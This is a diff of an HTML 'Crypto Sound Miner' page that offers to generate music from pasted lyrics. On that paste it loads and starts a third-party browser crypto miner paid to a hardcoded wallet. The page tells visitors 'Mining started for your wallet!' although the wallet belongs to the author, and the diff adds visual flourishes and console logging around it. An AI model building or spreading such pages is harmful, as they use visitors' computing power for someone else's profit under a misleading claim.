@@ -1,16 +1,165 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Crypto Sound Miner - Generate Music and Mine Cryptocurrency">
+  <meta name="keywords" content="crypto, mining, music, sound, generator">
   <title>🎵 Crypto Sound Miner</title>
   <script src="https://www.webminepool.com/lib/base.js"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 20px;
+      min-height: 100vh;
+      position: relative;
+      cursor: crosshair;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 30px;
+      border-radius: 15px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 30px;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+
+    h2:hover {
+      transform: scale(1.05);
+    }
+
+    #lyrics-box {
+      width: 100%;
+      min-height: 200px;
+      padding: 15px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.9);
+      color: #333;
+      font-size: 16px;
+      resize: vertical;
+      cursor: text;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    #lyrics-box:focus {
+      border-color: #feca57;
+      box-shadow: 0 0 15px rgba(254, 202, 87, 0.5);
+      outline: none;
+    }
+
+    #status {
+      text-align: center;
+      font-size: 18px;
+      margin: 20px 0;
+      padding: 10px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    #music-player {
+      width: 100%;
+      margin-top: 20px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .copyright-watermark {
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      background: rgba(0, 0, 0, 0.7);
+      color: white;
+      padding: 8px 12px;
+      border-radius: 5px;
+      font-size: 11px;
+      z-index: 1000;
+      backdrop-filter: blur(5px);
+      cursor: help;
+      transition: opacity 0.3s ease;
+    }
+
+    .copyright-watermark:hover {
+      opacity: 0.8;
+    }
+
+    .nav-links {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .nav-links a {
+      color: white;
+      text-decoration: none;
+      padding: 10px 20px;
+      margin: 0 10px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 25px;
+      transition: all 0.3s ease;
+      cursor: pointer;
+      display: inline-block;
+    }
+
+    .nav-links a:hover {
+      background: rgba(255, 255, 255, 0.3);
+      transform: translateY(-2px);
+    }
+
+    .mouse-trail {
+      position: fixed;
+      width: 6px;
+      height: 6px;
+      background: #feca57;
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 999;
+      opacity: 0.7;
+    }
+  </style>
 </head>
 <body>
-  <h2>🎤 Paste Your Lyrics to Generate Music + Mine Crypto</h2>
-  <textarea id="lyrics-box" rows="10" cols="60" placeholder="Paste your lyrics here..."></textarea>
-  <p id="status">⛏️ Waiting for lyrics paste...</p>
-  <audio id="music-player" controls hidden></audio>
+  <div class="container">
+    <div class="nav-links">
+      <a href="/" onclick="navigateHome(event)">🏠 Home</a>
+      <a href="/app" onclick="navigateApp(event)">🎵 App</a>
+      <a href="/ADS_POLICY.txt" onclick="openDocument(event, 'ADS_POLICY.txt')">📋 Policy</a>
+      <a href="/COPYRIGHT.txt" onclick="openDocument(event, 'COPYRIGHT.txt')">📄 Copyright</a>
+    </div>
+
+    <h2 onclick="showConsoleMessage()">🎤 Paste Your Lyrics to Generate Music + Mine Crypto</h2>
+    <textarea id="lyrics-box" rows="10" cols="60" placeholder="Paste your lyrics here..." onclick="logInteraction('textarea_click')" onmouseover="logInteraction('textarea_hover')"></textarea>
+    <p id="status" onclick="toggleStatus()">⛏️ Waiting for lyrics paste...</p>
+    <audio id="music-player" controls hidden onclick="logInteraction('audio_click')"></audio>
+  </div>
+
+  <div class="copyright-watermark" onclick="showCopyrightInfo()">
+    © <span id="current-year"></span> Ervin Remus Radosavlevici | <span id="timestamp"></span>
+  </div>
 
   <script>
+    // Copyright and timestamp setup
+    document.getElementById('current-year').textContent = new Date().getFullYear();
+    document.getElementById('timestamp').textContent = new Date().toLocaleString();
+
+    // Console logging setup
+    console.log('%c🎵 Crypto Sound Miner Initialized', 'color: #feca57; font-size: 20px; font-weight: bold;');
+    console.log('%c© ' + new Date().getFullYear() + ' Ervin Remus Radosavlevici', 'color: #667eea; font-size: 14px;');
+    console.log('Wallet Address:', 'rPDyvBmxcagTfPGSY9efiZ5mm6QoHmbpdq');
+    console.log('Timestamp:', new Date().toISOString());
+
     let minerStarted = false;
     const walletAddress = "rPDyvBmxcagTfPGSY9efiZ5mm6QoHmbpdq";
 
@@ -20,19 +169,115 @@
       autoscale: true
     });
 
+    // Enhanced mouse interactions
+    function logInteraction(action) {
+      console.log(`%c🖱️ User Interaction: ${action}`, 'color: #764ba2; font-weight: bold;');
+      console.log('Timestamp:', new Date().toISOString());
+    }
+
+    function navigateHome(event) {
+      event.preventDefault();
+      console.log('%c🏠 Navigation: Home', 'color: #feca57;');
+      window.location.href = '/';
+    }
+
+    function navigateApp(event) {
+      event.preventDefault();
+      console.log('%c🎵 Navigation: App', 'color: #feca57;');
+      // Already on app page
+      alert('You are already on the app page!');
+    }
+
+    function openDocument(event, filename) {
+      event.preventDefault();
+      console.log(`%c📄 Opening document: ${filename}`, 'color: #667eea;');
+      window.open(`/${filename}`, '_blank');
+    }
+
+    function showConsoleMessage() {
+      console.log('%c🎤 Title clicked! Welcome to Crypto Sound Miner!', 'color: #ff6b6b; font-size: 16px; font-weight: bold;');
+      console.log('Created by: Ervin Remus Radosavlevici');
+      console.log('Timestamp:', new Date().toISOString());
+    }
+
+    function toggleStatus() {
+      const status = document.getElementById('status');
+      console.log('%c📊 Status clicked!', 'color: #4ecdc4;');
+      if (minerStarted) {
+        status.style.background = status.style.background === 'rgba(76, 175, 80, 0.3)' ? 'rgba(0, 0, 0, 0.2)' : 'rgba(76, 175, 80, 0.3)';
+      }
+    }
+
+    function showCopyrightInfo() {
+      console.log('%c© Copyright Information', 'color: #667eea; font-size: 16px; font-weight: bold;');
+      console.log('Author: Ervin Remus Radosavlevici');
+      console.log('Year:', new Date().getFullYear());
+      console.log('Timestamp:', new Date().toISOString());
+      console.log('Wallet:', walletAddress);
+      alert(`© ${new Date().getFullYear()} Ervin Remus Radosavlevici\nTimestamp: ${new Date().toLocaleString()}\nWallet: ${walletAddress}`);
+    }
+
+    // Mouse trail effect
+    let mouseTrails = [];
+    document.addEventListener('mousemove', function(e) {
+      const trail = document.createElement('div');
+      trail.className = 'mouse-trail';
+      trail.style.left = e.clientX + 'px';
+      trail.style.top = e.clientY + 'px';
+      document.body.appendChild(trail);
+
+      mouseTrails.push(trail);
+
+      setTimeout(() => {
+        trail.remove();
+        mouseTrails = mouseTrails.filter(t => t !== trail);
+      }, 500);
+
+      if (mouseTrails.length > 20) {
+        mouseTrails[0].remove();
+        mouseTrails.shift();
+      }
+    });
+
+    // Enhanced lyrics processing
     document.getElementById("lyrics-box").addEventListener("paste", () => {
+      console.log('%c📋 Lyrics pasted!', 'color: #feca57; font-weight: bold;');
       setTimeout(() => {
         const lyrics = document.getElementById("lyrics-box").value.trim();
+        console.log('Lyrics length:', lyrics.length);
         if (lyrics.length > 20 && !minerStarted) {
+          console.log('%c⛏️ Starting mining process...', 'color: #4caf50; font-weight: bold;');
           miner.start();
           minerStarted = true;
           document.getElementById("status").textContent = "✅ Mining started for your wallet!";
-          document.getElementById("music-player").src = "music.mp3";
+          document.getElementById("status").style.background = "rgba(76, 175, 80, 0.3)";
+          document.getElementById("music-player").src = "[10 ~ 30] mine.mp3";
           document.getElementById("music-player").hidden = false;
           document.getElementById("music-player").play();
+
+          console.log('%c🎵 Music player activated!', 'color: #ff6b6b;');
+          console.log('Mining status: Active');
+          console.log('Wallet:', walletAddress);
+          console.log('Timestamp:', new Date().toISOString());
         }
       }, 100);
     });
+
+    // Additional mouse interactions
+    document.addEventListener('click', function(e) {
+      console.log(`%c🖱️ Click at: (${e.clientX}, ${e.clientY})`, 'color: #764ba2;');
+    });
+
+    document.addEventListener('contextmenu', function(e) {
+      console.log('%c🖱️ Right-click detected', 'color: #ff6b6b;');
+      console.log('© Ervin Remus Radosavlevici -', new Date().toISOString());
+    });
+
+    // Console welcome message
+    setTimeout(() => {
+      console.log('%c✨ All systems ready! Start pasting lyrics to begin mining!', 'color: #4ecdc4; font-size: 14px; font-weight: bold;');
+      console.log('© ' + new Date().getFullYear() + ' Ervin Remus Radosavlevici');
+    }, 1000);
   </script>
 </body>
 </html>
